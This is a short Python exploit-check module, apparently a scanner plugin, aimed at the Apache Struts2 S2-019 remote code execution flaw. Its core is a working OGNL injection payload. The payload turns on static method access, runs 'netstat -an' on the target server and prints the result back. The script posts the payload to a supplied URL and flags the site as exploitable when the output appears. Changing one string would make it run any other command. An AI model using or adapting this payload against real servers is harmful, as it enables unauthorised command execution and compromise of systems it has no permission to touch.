#! /usr/bin/env python
#coding:utf-8
import requests

author = ""
scope = ""
description = "Struts2 远程代码执行漏洞"
reference = ""
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]

def struts2_019(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()'''
    url += exp

    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-019 存在利用"
    except:
        return None
    return None